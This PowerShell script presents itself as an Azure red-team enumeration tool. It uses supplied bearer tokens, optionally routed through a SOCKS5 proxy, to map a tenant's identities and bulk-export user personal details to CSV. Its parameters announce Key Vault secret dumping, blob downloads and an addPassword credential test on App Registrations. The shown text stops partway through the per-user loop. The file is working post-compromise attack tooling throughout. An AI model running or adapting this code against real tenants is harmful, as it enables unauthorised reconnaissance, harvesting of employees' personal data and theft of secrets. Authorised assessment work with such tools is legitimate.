<#
.SYNOPSIS
    Azure full enumeration for red team assessments.

.PARAMETER Token
    ARM bearer token  (audience: https://management.azure.com)
    Enumerates all Azure resources.

.PARAMETER GraphToken
    Graph bearer token (audience: https://graph.microsoft.com)
    Enumerates Entra ID objects.

.PARAMETER KVToken
    Key Vault data-plane token (audience: https://vault.azure.net)
    Required to read secret VALUES from Key Vaults.
    Without this, secret names are listed but values return HTTP 401.

.PARAMETER OutputFile
    Path to tee all terminal output into (uses Start-Transcript).

.PARAMETER Clean
    Suppress empty sections and "None found" messages.

.EXAMPLE
    .\all.ps1 -Token $arm -GraphToken $graph -KVToken $kv -OutputFile .\run.log -Clean
#>

# Code Commented by LLM sorry for any mistakes in advanced

param(
    [string]$Token              = "",  # ARM bearer token  -- audience: https://management.azure.com
    [string]$GraphToken         = "",  # Graph bearer token -- audience: https://graph.microsoft.com
    [string]$KVToken            = "",  # Key Vault data-plane token -- audience: https://vault.azure.net
    [string]$StorageToken       = "",  # Storage data-plane token -- audience: https://storage.azure.com
    [string]$OutputFile         = "",  # Tee all output to this file via Start-Transcript
    [string]$Proxy              = "",  # SOCKS5/HTTP proxy  e.g. "socks5://127.0.0.1:1080" or "http://127.0.0.1:8080"
    [switch]$Clean,                    # Suppress empty sections / "None found" lines
    [switch]$NoStorageDump,            # Skip blob enumeration and download (still lists account metadata)
    [switch]$NoSecretTest,             # Skip addPassword test on App Registrations
    [switch]$NoProfileWriteTest,       # Skip PATCH /me self-profile update probe
    [switch]$NoUserDetails,            # Skip per-user detail loop (memberships, owned objects, devices per user)
    [switch]$NoServicePrincipals       # Skip Service Principal enumeration
)

if (-not $Token -and -not $GraphToken) {
    Write-Error "Provide at least -Token (ARM) or -GraphToken (Graph), or both."
    exit 1
}

# -- Transcript ----------------------------------------------------------------
if ($OutputFile) {
    Start-Transcript -Path $OutputFile -Append -Force | Out-Null
    Write-Host "[+] Transcribing output to: $OutputFile" -ForegroundColor DarkGray
}

# Guaranteed transcript stop on any exit path (error, Ctrl+C, normal finish)
function Stop-Script {
    param([int]$Code = 0)
    if ($OutputFile) { try { Stop-Transcript | Out-Null } catch {} }
    exit $Code
}
trap { if ($OutputFile) { try { Stop-Transcript | Out-Null } catch {} }; break }

# -- Proxy setup ---------------------------------------------------------------
$script:Proxy        = $Proxy
$script:UseCurl      = $false   # PS5.1 + SOCKS5 fallback
$script:CurlSocksArg = ""       # "127.0.0.1:1080"

if ($Proxy) {
    $isSOCKS = $Proxy -match '^socks'
    $isPS5   = $PSVersionTable.PSVersion.Major -lt 7

    if ($isSOCKS -and $isPS5) {
        # PS5.1 cannot speak SOCKS5 natively, but curl.exe (ships with Win10 1803+) can.
        $curlExe = Get-Command curl.exe -ErrorAction SilentlyContinue
        if ($curlExe) {
            if ($Proxy -match 'socks\d*://(.+)') { $script:CurlSocksArg = $Matches[1] }
            $script:UseCurl = $true
            Write-Host "[+] PS5.1 + SOCKS5 detected -- routing all API calls via curl.exe" -ForegroundColor Yellow
            Write-Host "[+] SOCKS5 : $($script:CurlSocksArg)" -ForegroundColor DarkGray
        } else {
            Write-Host "[!] SOCKS5 on PS5.1 requires curl.exe (not found in PATH)." -ForegroundColor Red
            Write-Host "    Solutions: (1) run with pwsh.exe  (2) install curl  (3) use -Proxy 'http://...'" -ForegroundColor Yellow
            $script:Proxy = ""
        }
    } else {
        # HTTP proxy on PS5/PS7, or SOCKS5 on PS7 -- both work with Invoke-RestMethod
        try {
            [System.Net.WebRequest]::DefaultWebProxy = New-Object System.Net.WebProxy($Proxy)
            [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials
        } catch {}
        Write-Host "[+] Proxy : $Proxy" -ForegroundColor DarkGray
    }
}

# -- Output directory ----------------------------------------------------------
$RunTag  = Get-Date -Format "yyyyMMdd_HHmmss"
$OutRoot = Join-Path (Get-Location) "EHOOAZ_$RunTag"
$null = New-Item -ItemType Directory -Force -Path $OutRoot

$ArmBase   = "https://management.azure.com"
$GraphBase = "https://graph.microsoft.com/v1.0"
$RoleCache = @{}
$script:SummaryLines = New-Object System.Collections.Generic.List[string]

# -- Output helpers ------------------------------------------------------------

$script:PendingHeader  = $null
$script:PendingSection = $null

function Flush-Pending {
    if ($script:PendingHeader) {
        Write-Host $script:PendingHeader -ForegroundColor Magenta
        $script:PendingHeader = $null
    }
    if ($script:PendingSection) {
        Write-Host $script:PendingSection -ForegroundColor Cyan
        $script:PendingSection = $null
    }
}

function Write-Header {
    param($t)
    if ($Clean) {
        $script:PendingHeader  = "`n" + ("=" * 70) + "`n  $t`n" + ("=" * 70)
        $script:PendingSection = $null
    } else {
        Write-Host ("`n" + ("=" * 70) + "`n  $t`n" + ("=" * 70)) -ForegroundColor Magenta
    }
}

function Write-Section {
    param($t)
    if ($Clean) {
        $script:PendingSection = "`n" + ("-" * 60) + "`n[*] $t"
    } else {
        Write-Host ("`n" + ("-" * 60) + "`n[*] $t") -ForegroundColor Cyan
    }
}

function Write-Hit  { param($t) Flush-Pending; Write-Host "  [+] $t" -ForegroundColor Green }
function Write-Warn { param($t) Flush-Pending; Write-Host "  [!] $t" -ForegroundColor Red   }
function Write-Info { param($t) Flush-Pending; Write-Host "      $t"                         }

function Write-None {
    param($t = "  None found")
    if (-not $Clean) { Flush-Pending; Write-Host "      $t" }
}

function Add-Summary { param($s) $script:SummaryLines.Add($s) }

# -- CSV helper ----------------------------------------------------------------
function Save-Csv {
    param([string]$Path, [object[]]$Data)
    if (-not $Data -or $Data.Count -eq 0) { return }
    $dir = Split-Path $Path -Parent
    if (-not (Test-Path $dir)) { $null = New-Item -ItemType Directory -Force -Path $dir }
    $Data | Export-Csv -Path $Path -NoTypeInformation -Encoding UTF8 -Force
    Write-Info "[CSV] Saved $($Data.Count) records -> $Path"
}

# -- JWT helpers ---------------------------------------------------------------
function Get-TokenClaims {
    param([string]$Tok)
    if (-not $Tok) { return $null }
    try {
        $b64 = $Tok.Split('.')[1]
        switch ($b64.Length % 4) { 2 { $b64 += "==" } 3 { $b64 += "=" } }
        return [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b64)) | ConvertFrom-Json
    } catch { return $null }
}

function Get-TenantIdFromToken {
    param([string]$Tok)
    $c = Get-TokenClaims $Tok
    if ($c) { return $c.tid } else { return "" }
}

# -- HTTP helpers --------------------------------------------------------------
# Invoke-WebCall: single entry point for all HTTP calls.
# On PS5.1 + SOCKS5, routes through curl.exe (ships with Win10 1803+).
# On PS7 or HTTP proxy, uses Invoke-RestMethod.
# Returns: parsed PSObject on success, $null on error (errors already printed).
# Special: returns [PSCustomObject]@{} for HTTP 2xx with no body (e.g. 204 No Content).
function Invoke-WebCall {
    param(
        [string]$Method     = "GET",
        [string]$Uri,
        [hashtable]$Headers = @{},
        [string]$Body       = "",
        [int]$TimeoutSec    = 30,
        [switch]$Quiet      # suppress error output for expected probe calls
    )
    if ($script:UseCurl) {
        # Build curl.exe argument list
        $ca = @("--silent", "--max-time", $TimeoutSec, "-X", $Method,
                "--socks5", $script:CurlSocksArg,
                "--write-out", "`n%{http_code}")
        foreach ($k in $Headers.Keys) { $ca += "-H", "${k}: $($Headers[$k])" }

        # IMPORTANT: On Windows, PowerShell mangles double-quotes in JSON when passing strings to
        # external processes via CreateProcess. Writing the body to a temp file and using
        # --data-binary @file is the only reliable way to pass JSON to curl.exe on Windows.
        $tmpf = $null
        if ($Body) {
            $ca  += "-H", "Content-Type: application/json"
            $tmpf = [System.IO.Path]::GetTempFileName()
            [System.IO.File]::WriteAllText($tmpf, $Body, [System.Text.Encoding]::UTF8)
            $ca  += "--data-binary", "@$tmpf"
        }
        $ca += $Uri

        try   { $raw = (& curl.exe @ca 2>$null) -join "`n" }
        finally { if ($tmpf) { Remove-Item $tmpf -Force -ErrorAction SilentlyContinue } }

        if (-not $raw) {
            if (-not $Quiet) { Write-Host "    [CURL ERROR] No response from $Uri -- SOCKS5 proxy unreachable?" -ForegroundColor Red }
            return $null
        }
        # Last line is the HTTP status code injected by --write-out
        $lastNL = $raw.LastIndexOf("`n")
        $code   = [int]($raw.Substring($lastNL + 1).Trim())
        $json   = if ($lastNL -gt 0) { $raw.Substring(0, $lastNL).Trim() } else { "" }

        if ($code -eq 0) {
            if (-not $Quiet) { Write-Host "    [CURL ERROR] Could not connect to $Uri" -ForegroundColor Red }
            return $null
        }
        if ($code -ge 400) {
            if (-not $Quiet) { Write-Host "    [HTTP $code] $(([System.Uri]$Uri).PathAndQuery)" -ForegroundColor DarkGray }
            return $null
        }
        if (-not $json) { return [PSCustomObject]@{} }   # 204 No Content -- success with empty body
        try { return $json | ConvertFrom-Json } catch { return $null }
    }

    # -- Invoke-RestMethod path (PS7 or HTTP proxy) ----------------------------
    $splat = @{ Method=$Method; Uri=$Uri; Headers=$Headers; ErrorAction="Stop"; TimeoutSec=$TimeoutSec }
    if ($Body) { $splat.Body = $Body; $splat.ContentType = "application/json" }
    if ($script:Proxy -and $script:Proxy -ne "WARNED") { $splat.Proxy = $script:Proxy }
    return Invoke-RestMethod @splat
}

function Invoke-GraphApi {
    param([string]$Url)
    if (-not $GraphToken -or -not $Url) { return $null }
    try {
        return Invoke-WebCall -Method "GET" -Uri $Url -Headers @{ Authorization = "Bearer $GraphToken" }
    } catch {
        $code = $_.Exception.Response.StatusCode.value__
        $msg  = $_.ErrorDetails.Message
        if ($code) {
            $detail = if ($msg) { " -- " + $msg.Substring(0, [Math]::Min(120, $msg.Length)) } else { "" }
            Write-Host "    [Graph HTTP $code] $(([System.Uri]$Url).PathAndQuery)$detail" -ForegroundColor DarkGray
        } else {
            Write-Host "    [Graph NETWORK ERROR] $($_.Exception.Message)" -ForegroundColor Red
            if (-not $script:Proxy -and -not $script:UseCurl) {
                Write-Host "    [!] No proxy set. Run: .\all.ps1 ... -Proxy 'socks5://127.0.0.1:1080' (PS7) or 'http://...' (PS5.1)" -ForegroundColor Yellow
                $script:Proxy = "WARNED"
            }
        }
        return $null
    }
}

function Invoke-ArmApi {
    param([string]$Url, [string]$Method = "GET", [string]$Body = "")
    if (-not $Url -or $Url -notmatch "^https://") { return $null }
    try {
        return Invoke-WebCall -Method $Method -Uri $Url -Headers @{ Authorization = "Bearer $Token" } -Body $Body
    } catch {
        $code = $_.Exception.Response.StatusCode.value__
        if ($code) {
            Write-Host "    [ARM HTTP $code] $(([System.Uri]$Url).PathAndQuery)" -ForegroundColor DarkGray
        } else {
            Write-Host "    [ARM NETWORK ERROR] $($_.Exception.Message)" -ForegroundColor Red
        }
        return $null
    }
}

function Invoke-KVApi {
    param([string]$Uri, [string]$BearerToken)
    try {
        return Invoke-WebCall -Method "GET" -Uri $Uri -Headers @{ Authorization = "Bearer $BearerToken" }
    } catch {
        $code = $_.Exception.Response.StatusCode.value__
        if ($code) { Write-Host "    [KV HTTP $code] $Uri" -ForegroundColor DarkGray }
        return $null
    }
}

# ---- JWT helper: decode audience + upn from a bearer token (no signature check) ----
function Get-JwtClaims {
    param([string]$Token)
    try {
        $parts = $Token.Split('.')
        if ($parts.Count -lt 2) { return $null }
        $b64 = $parts[1] -replace '-', '+' -replace '_', '/'
        switch ($b64.Length % 4) { 1 { $b64 += '===' } 2 { $b64 += '==' } 3 { $b64 += '=' } }
        $json = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b64))
        return $json | ConvertFrom-Json
    } catch { return $null }
}

# ---- Azure Blob Service REST API helpers ------------------------------------
# SharedKey auth for blob data-plane when listKeys succeeds.
function Get-BlobSharedKeyHeaders {
    param(
        [string]$Account,
        [string]$Key,
        [string]$Method,    # GET or HEAD
        [string]$Path,      # e.g. "/" or "/container" or "/container/blob.txt"
        [string]$Query = "" # e.g. "comp=list" or "restype=container&comp=list"
    )
    $date    = [DateTime]::UtcNow.ToString("R")   # RFC 1123
    $version = "2020-08-04"
    # Canonicalized headers -- must be sorted, lowercase, no trailing spaces
    $canonHdrs = "x-ms-date:$date`nx-ms-version:$version`n"
    # Canonicalized resource -- account + path + sorted query params
    $canonRes = "/$Account$Path"
    if ($Query) {
        $qLines = $Query -split "&" | ForEach-Object {
            $kv = $_ -split "=", 2
            "$($kv[0].ToLower()):$($kv[1])"
        } | Sort-Object
        $canonRes += "`n" + ($qLines -join "`n")
    }
    # StringToSign: VERB + 11 empty fields + canonicalized headers + resource
    $sts  = "$Method`n`n`n`n`n`n`n`n`n`n`n`n$canonHdrs$canonRes"
    $hmac = [Security.Cryptography.HMACSHA256]::new([Convert]::FromBase64String($Key))
    $sig  = [Convert]::ToBase64String($hmac.ComputeHash([Text.Encoding]::UTF8.GetBytes($sts)))
    return @{
        "x-ms-date"     = $date
        "x-ms-version"  = $version
        "Authorization" = "SharedKey ${Account}:${sig}"
    }
}

# Fetch raw text body from blob service (returns XML string, not parsed JSON)
function Invoke-BlobRaw {
    param([string]$Uri, [hashtable]$Headers, [int]$TimeoutSec = 30)
    if ($script:UseCurl) {
        $ca = @("--silent", "--max-time", $TimeoutSec, "-X", "GET",
                "--socks5", $script:CurlSocksArg,
                "--write-out", "`n%{http_code}")
        foreach ($k in $Headers.Keys) { $ca += "-H", "${k}: $($Headers[$k])" }
        $ca += $Uri
        $raw  = (& curl.exe @ca 2>$null) -join "`n"
        if (-not $raw) { return $null }
        $nl   = $raw.LastIndexOf("`n")
        $code = [int]($raw.Substring($nl + 1).Trim())
        if ($code -lt 200 -or $code -ge 300) { return $null }
        return if ($nl -gt 0) { $raw.Substring(0, $nl).Trim() } else { "" }
    } else {
        $splat = @{ Method = "GET"; Uri = $Uri; Headers = $Headers; ErrorAction = "Stop"; TimeoutSec = $TimeoutSec; UseBasicParsing = $true }
        if ($script:Proxy -and $script:Proxy -ne "WARNED") { $splat.Proxy = $script:Proxy }
        try {
            $content = (Invoke-WebRequest @splat).Content
            # Invoke-WebRequest on PS5.1 can return the UTF-8 BOM (0xEF BB BF) as text characters
            # ï»¿ (Latin-1 mis-decode) or \uFEFF (Unicode). Strip both so [xml] can parse cleanly.
            $content = $content.TrimStart([char]0xFEFF)
            if ($content.StartsWith("ï»¿")) { $content = $content.Substring(3) }
            return $content
        } catch {
            # Capture the Azure error XML so callers can show a meaningful message
            $errCode = 0; $errMsg = ""
            try { $errCode = [int]$_.Exception.Response.StatusCode } catch {}
            try {
                $stream = $_.Exception.Response.GetResponseStream()
                if ($stream) {
                    $reader  = [System.IO.StreamReader]::new($stream)
                    $rawBody = $reader.ReadToEnd()
                    try {
                        [xml]$xe = $rawBody
                        $errMsg  = "$($xe.Error.Code)"
                        if ($xe.Error.Message) {
                            # Azure message has trailing RequestId/Time -- take just first line
                            $errMsg += ": $($xe.Error.Message -split '\n' | Select-Object -First 1)"
                        }
                    } catch { $errMsg = $rawBody.Substring(0, [Math]::Min(200, $rawBody.Length)) }
                }
            } catch {}
            $script:LastBlobError = "HTTP $errCode$(if ($errMsg) { ' -- ' + $errMsg })"
            return $null
        }
    }
}

# Download a blob to disk; returns $true on success
function Save-BlobFile {
    param([string]$Uri, [hashtable]$Headers, [string]$OutputPath, [int]$TimeoutSec = 120)
    $dir = Split-Path -Parent $OutputPath
    if ($dir) { $null = New-Item -ItemType Directory -Force -Path $dir }
    if ($script:UseCurl) {
        $ca = @("--silent", "--max-time", $TimeoutSec, "-X", "GET",
                "--socks5", $script:CurlSocksArg,
                "--write-out", "`n%{http_code}",
                "-o", $OutputPath)
        foreach ($k in $Headers.Keys) { $ca += "-H", "${k}: $($Headers[$k])" }
        $ca += $Uri
        $raw  = (& curl.exe @ca 2>$null) -join "`n"
        $nl   = $raw.LastIndexOf("`n")
        $code = if ($nl -ge 0) { [int]($raw.Substring($nl + 1).Trim()) } else { 0 }
        return ($code -ge 200 -and $code -lt 300)
    } else {
        $splat = @{ Method = "GET"; Uri = $Uri; Headers = $Headers; OutFile = $OutputPath; ErrorAction = "Stop"; TimeoutSec = $TimeoutSec }
        if ($script:Proxy -and $script:Proxy -ne "WARNED") { $splat.Proxy = $script:Proxy }
        try { Invoke-RestMethod @splat; return $true } catch {
            $code = 0; try { $code = [int]$_.Exception.Response.StatusCode } catch {}
            $script:LastBlobError = "HTTP $code"
            return $false
        }
    }
}

function Get-ArmAll {
    param([string]$Url)
    $items = @()
    while ($Url) {
        $r = Invoke-ArmApi $Url
        if (-not $r) { break }
        if ($r.PSObject.Properties.Name -contains 'value') { $items += $r.value }
        elseif ($r -is [array]) { $items += $r }
        $Url = $r.nextLink
    }
    return $items
}

function Get-GraphAll {
    param([string]$Url)
    $items = @()
    while ($Url) {
        $r = Invoke-GraphApi $Url
        if (-not $r) { break }
        if ($r.PSObject.Properties.Name -contains 'value') { $items += $r.value }
        elseif ($r -is [array]) { $items += $r }
        $Url = $r.'@odata.nextLink'
    }
    return $items
}

# -- Resolvers -----------------------------------------------------------------
function Get-RoleName {
    param([string]$RoleDefinitionId)
    if (-not $RoleDefinitionId) { return "[no-role-id]" }
    if ($RoleCache.ContainsKey($RoleDefinitionId)) { return $RoleCache[$RoleDefinitionId] }
    $url  = $ArmBase + $RoleDefinitionId + "?api-version=2022-04-01"
    $role = Invoke-ArmApi $url
    $name = if ($role -and $role.properties.roleName) {
        $role.properties.roleName
    } else {
        "RoleId:" + ($RoleDefinitionId -split "/")[-1]
    }
    $RoleCache[$RoleDefinitionId] = $name
    return $name
}

function Get-MyPermissions {
    param([string]$ResourceId)
    $url  = $ArmBase + $ResourceId + "/providers/Microsoft.Authorization/permissions?api-version=2022-04-01"
    $resp = Invoke-ArmApi $url
    return $resp.value
}

function Get-RGFromId {
    param([string]$Id)
    if ($Id -match '/resourceGroups/([^/]+)') { return $Matches[1] }
    return ""
}

function Get-EffectiveNSG {
    param([string]$NicId)
    $url = $ArmBase + $NicId + "/effectiveNetworkSecurityGroups?api-version=2023-04-01"

    if ($script:UseCurl) {
        # Use --include to capture response headers (needed for 202 Location)
        $ca = @("--silent", "--include", "--max-time", 60, "-X", "POST",
                "--socks5", $script:CurlSocksArg,
                "-H", "Authorization: Bearer $Token", "-H", "Content-Length: 0", $url)
        $raw = (& curl.exe @ca 2>$null) -join "`n"
        if (-not $raw) { return $null }
        # Split header section from body
        $sep = if ($raw -match '\r\n\r\n') { "`r`n`r`n" } else { "`n`n" }
        $parts      = $raw -split [regex]::Escape($sep), 2
        $headerSec  = $parts[0]
        $bodySec    = if ($parts.Count -gt 1) { $parts[1].Trim() } else { "" }
        if ($headerSec -match 'HTTP/\S+\s+(\d{3})') { $code = [int]$Matches[1] } else { return $null }
        if ($code -eq 200 -and $bodySec) { try { return $bodySec | ConvertFrom-Json } catch { return $null } }
        if ($code -eq 202 -and $headerSec -match '(?m)^[Ll]ocation:\s*(.+)$') {
            $location = $Matches[1].Trim()
            Start-Sleep -Seconds 5
            return Invoke-WebCall -Method "GET" -Uri $location -Headers @{ Authorization = "Bearer $Token" }
        }
        return $null
    }

    try {
        $wrbSplat = @{ Method = "POST"; Uri = $url; Headers = @{ Authorization = "Bearer $Token"; "Content-Length" = "0" }; ErrorAction = "Stop"; TimeoutSec = 30 }
        if ($script:Proxy -and $script:Proxy -ne "WARNED") { $wrbSplat.Proxy = $script:Proxy }
        $resp = Invoke-WebRequest @wrbSplat
        if ($resp.StatusCode -eq 200) { return $resp.Content | ConvertFrom-Json }
        if ($resp.StatusCode -eq 202) {
            $location = $resp.Headers["Location"]
            if (-not $location) { return $null }
            Start-Sleep -Seconds 3
            $s202 = @{ Method = "GET"; Uri = $location; Headers = @{ Authorization = "Bearer $Token" }; ErrorAction = "Stop"; TimeoutSec = 30 }
            if ($script:Proxy -and $script:Proxy -ne "WARNED") { $s202.Proxy = $script:Proxy }
            return Invoke-RestMethod @s202
        }
    } catch { return $null }
    return $null
}

# -- Resolve Tenant ID ---------------------------------------------------------
$_tokForTenant = if ($Token) { $Token } else { $GraphToken }
$TenantId = Get-TenantIdFromToken $_tokForTenant
if (-not $TenantId -and $GraphToken) {
    $orgResp = Invoke-GraphApi "$GraphBase/organization?`$select=id,displayName"
    if ($orgResp -and $orgResp.value) { $TenantId = $orgResp.value[0].id }
}

$TenantLabel = if ($TenantId) { $TenantId } else { "UnknownTenant" }
$TenantDir   = Join-Path $OutRoot $TenantLabel
$IdDir       = Join-Path $TenantDir "Identity"
$AutoLogDir  = Join-Path $TenantDir "AutomationLogs"
foreach ($d in @($TenantDir, $IdDir, $AutoLogDir)) {
    $null = New-Item -ItemType Directory -Force -Path $d
}

Write-Host ""
Write-Host "[+] Run started    : $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" -ForegroundColor DarkGray
Write-Host "[+] Output folder  : $OutRoot"                                   -ForegroundColor DarkGray
Write-Host "[+] Tenant ID      : $(if ($TenantId) { $TenantId } else { '[unknown -- decode failed]' })" -ForegroundColor DarkGray

# =============================================================================
# SECTION 1 -- ENTRA ID  (requires -GraphToken)
# =============================================================================

if ($GraphToken) {

    Write-Header "ENTRA ID  (Microsoft Graph)"

    # -- Tenant Information ----------------------------------------------------
    Write-Section "Tenant Information"
    $orgInfo = Invoke-GraphApi "$GraphBase/organization?`$select=id,displayName,verifiedDomains,tenantType"
    if ($orgInfo -and $orgInfo.value) {
        $o = $orgInfo.value[0]
        Write-Hit "Tenant: $($o.displayName)  |  ID: $($o.id)"
        if ($o.verifiedDomains) {
            $o.verifiedDomains | ForEach-Object {
                Write-Info "  Domain: $($_.name)  [Default: $($_.isDefault)]"
            }
        }
    } else { Write-None }

    # -- Current Identity ------------------------------------------------------
    Write-Section "Current Identity"
    # Decode the Graph token to determine identity type before hitting any endpoint.
    # /me returns HTTP 400 for Managed Identity and Service Principal tokens (app tokens).
    $_gClaims = Get-TokenClaims $GraphToken
    # idtyp = "user" for delegated; "app" for client-credentials / managed identity
    $_isUserToken = $_gClaims -and ($_gClaims.idtyp -eq "user" -or $_gClaims.upn -or $_gClaims.unique_name)
    $_identOid    = if ($_gClaims) { $_gClaims.oid } else { "" }
    $_identAppId  = if ($_gClaims) { $_gClaims.appid } else { "" }
    $_miRid       = if ($_gClaims) { $_gClaims.xms_mirid } else { "" }  # e.g. /subscriptions/.../virtualMachines/name

    if ($_isUserToken) {
        # ---- User token: /me works fine ----
        $me = Invoke-GraphApi "$GraphBase/me?`$select=id,displayName,userPrincipalName,mail,jobTitle,mobilePhone,officeLocation,accountEnabled,onPremisesSyncEnabled,createdDateTime,lastPasswordChangeDateTime,userType"
        if ($me) {
            Write-Hit "Type         : User"
            Write-Info "UPN          : $($me.userPrincipalName)"
            Write-Info "Display Name : $($me.displayName)"
            Write-Info "Object ID    : $($me.id)"
            Write-Info "Mail         : $($me.mail)"
            Write-Info "Job Title    : $($me.jobTitle)"
            Write-Info "Enabled      : $($me.accountEnabled)"
            Write-Info "Hybrid       : $($me.onPremisesSyncEnabled)"
            Write-Info "User Type    : $($me.userType)"
            Write-Info "Created      : $($me.createdDateTime)"
            Write-Info "LastPwdChg   : $($me.lastPasswordChangeDateTime)"
            Add-Summary "  [Identity] User  $($me.userPrincipalName)  (OID: $($me.id))"

            $myMemberOf = Get-GraphAll "$GraphBase/me/memberOf"
            if ($myMemberOf) {
                Write-Info "Member of:"
                $myMemberOf | ForEach-Object {
                    $moType = if ($_.'@odata.type') { $_.'@odata.type' -replace '#microsoft\.graph\.', '' } else { "group" }
                    if ($moType -eq "administrativeUnit") {
                        Write-Warn "  - [administrativeUnit] $($_.displayName)  (ID: $($_.id))"
                    } elseif ($moType -eq "directoryRole") {
                        Write-Hit "  - [directoryRole] $($_.displayName)  (ID: $($_.id))"
                    } else {
                        Write-Info "  - [$moType] $($_.displayName)  (ID: $($_.id))"
                    }
                }
            }
            $myOwned = Get-GraphAll "$GraphBase/me/ownedObjects?`$select=id,displayName"
            if ($myOwned) {
                Write-Info "Owns:"
                $myOwned | ForEach-Object { Write-Info "  - $($_.displayName)  (ID: $($_.id))" }
            }
        } else { Write-None }

    } else {
        # ---- App / Managed Identity token: use OID directly ----
        Write-Hit "Type         : $(if ($_miRid) { 'Managed Identity' } else { 'Service Principal / App' })"
        Write-Info "Object ID    : $_identOid"
        Write-Info "App ID       : $_identAppId"
        Write-Info "Tenant ID    : $($TenantId)"
        if ($_miRid) {
            Write-Warn "MI Resource  : $_miRid"
            # Parse VM/resource name from the resource ID path
            $miParts = $_miRid -split '/'
            Write-Info "  Subscription : $($miParts | Select-Object -Index 2)"
            Write-Info "  Res Group    : $($miParts | Select-Object -Index 4)"
            Write-Info "  Resource     : $($miParts[-1])  [$($miParts[-2])]"
            Add-Summary "  [Identity] ManagedIdentity  OID=$_identOid  Resource=$_miRid"
        } else {
            Add-Summary "  [Identity] ServicePrincipal  AppId=$_identAppId  OID=$_identOid"
        }

        # Show token audience + scopes/roles so you know what you can do
        if ($_gClaims.aud) { Write-Info "Audience     : $($_gClaims.aud)" }
        if ($_gClaims.roles) {
            Write-Warn "App Roles    : $($_gClaims.roles -join ', ')"
        }
        if ($_gClaims.scp) {
            Write-Info "Delegated Scp: $($_gClaims.scp)"
        }

        # Look up the Service Principal in Graph by OID
        if ($_identOid) {
            $mySP = Invoke-GraphApi "$GraphBase/servicePrincipals/$_identOid"
            if ($mySP) {
                Write-Hit "SP Name      : $($mySP.displayName)"
                Write-Info "SP Type      : $($mySP.servicePrincipalType)"
                Write-Info "SP Enabled   : $($mySP.accountEnabled)"
                $mySP.passwordCredentials | ForEach-Object { Write-Warn "  [SECRET] $($_.displayName)  Expires: $($_.endDateTime)" }
                $mySP.keyCredentials      | ForEach-Object { Write-Warn "  [CERT]   $($_.displayName)  Expires: $($_.endDateTime)" }
            }

            # memberOf for the SP
            $mySpMemberOf = Get-GraphAll "$GraphBase/servicePrincipals/$_identOid/memberOf"
            if ($mySpMemberOf) {
                Write-Info "Member of:"
                $mySpMemberOf | ForEach-Object {
                    $moType = if ($_.'@odata.type') { $_.'@odata.type' -replace '#microsoft\.graph\.', '' } else { "group" }
                    if ($moType -eq "administrativeUnit") {
                        Write-Warn "  - [administrativeUnit] $($_.displayName)  (ID: $($_.id))"
                    } elseif ($moType -eq "directoryRole") {
                        Write-Hit "  - [directoryRole] $($_.displayName)  (ID: $($_.id))"
                        Add-Summary "  [Identity MemberOf] directoryRole: $($_.displayName)"
                    } else {
                        Write-Info "  - [$moType] $($_.displayName)  (ID: $($_.id))"
                    }
                }
            } else {
                Write-Info "Member of    : [none or no access]"
            }

            # transitiveMemberOf gives nested group memberships too
            $myTransitive = Get-GraphAll "$GraphBase/servicePrincipals/$_identOid/transitiveMemberOf?`$select=id,displayName"
            if ($myTransitive -and $myTransitive.Count -gt (@($mySpMemberOf).Count)) {
                Write-Info "Transitive Member of (additional):"
                $directIds = @($mySpMemberOf | ForEach-Object { $_.id })
                $myTransitive | Where-Object { $directIds -notcontains $_.id } | ForEach-Object {
                    $tmType = if ($_.'@odata.type') { $_.'@odata.type' -replace '#microsoft\.graph\.', '' } else { "group" }
                    Write-Info "  - [$tmType] $($_.displayName)  (ID: $($_.id))"
                }
            }
        }

        # Also decode ARM token if provided -- show its audience/roles
        if ($Token) {
            $_aClaims = Get-TokenClaims $Token
            Write-Info ""
            Write-Info "ARM Token:"
            Write-Info "  Audience : $($_aClaims.aud)"
            if ($_aClaims.roles) { Write-Warn "  Roles    : $($_aClaims.roles -join ', ')" }
            if ($_aClaims.scp)   { Write-Info "  Scp      : $($_aClaims.scp)" }
        }
    }

    # -- Users -----------------------------------------------------------------
    Write-Section "Users"
    $userFields = "id,displayName,userPrincipalName,givenName,surname,jobTitle,mail,mobilePhone,officeLocation,preferredLanguage,accountEnabled,onPremisesSyncEnabled,createdDateTime,lastPasswordChangeDateTime,userType,assignedLicenses"
    $users = Get-GraphAll "$GraphBase/users?`$select=$userFields&`$top=999"

    $usersWithMail = $users | Where-Object { $_.mail }
    $hybridUsers   = $users | Where-Object { $_.onPremisesSyncEnabled }
    $disabledUsers = $users | Where-Object { -not $_.accountEnabled }
    $guestUsers    = $users | Where-Object { $_.userType -eq "Guest" }

    Write-Info "Total           : $($users.Count)"
    Write-Info "  With Mailbox  : $($usersWithMail.Count)"
    Write-Info "  Hybrid        : $($hybridUsers.Count)"
    Write-Info "  Disabled      : $($disabledUsers.Count)"
    Write-Info "  Guest         : $($guestUsers.Count)"

    # Always save full CSV
    $userCsvData = $users | Select-Object id, displayName, userPrincipalName, givenName, surname,
        jobTitle, mail, mobilePhone, officeLocation, preferredLanguage,
        accountEnabled, onPremisesSyncEnabled, createdDateTime,
        lastPasswordChangeDateTime, userType
    $userCsvPath = Join-Path $IdDir "Users_AllDetails.csv"
    Save-Csv $userCsvPath $userCsvData
    Write-Info "Full user details saved to: $userCsvPath"
    Write-Info ""

    # auDescCache shared by Users, Groups, SPs, Automations sections -- always init
    $auDescCache = @{}

    if ($NoUserDetails) {
        Write-Info "  [--NoUserDetails] Per-user detail loop skipped (pass without flag for memberships, owned objects, device ownership)"
    } else {
    $membershipRows = New-Object System.Collections.Generic.List[object]

    foreach ($u in $users) {
        $tags = @()
        if (-not $u.accountEnabled)   { $tags += "DISABLED" }
        if ($u.onPremisesSyncEnabled) { $tags += "HYBRID"   }
        if ($u.userType -eq "Guest")  { $tags += "GUEST"    }
        $mailStr = if ($u.mail) { "  Mail: $($u.mail)" } else { "" }
        $tagStr  = if ($tags)   { "  [" + ($tags -join "|") + "]" } else { "" }

        Write-Hit "$($u.userPrincipalName)$tagStr$mailStr"
        Write-Info "    DisplayName : $($u.displayName)"
        Write-Info "    GivenName   : $($u.givenName)  $($u.surname)"
        Write-Info "    JobTitle    : $($u.jobTitle)"
        Write-Info "    Mobile      : $($u.mobilePhone)"
        Write-Info "    Office      : $($u.officeLocation)"
        Write-Info "    Language    : $($u.preferredLanguage)"
        Write-Info "    ObjectId    : $($u.id)"
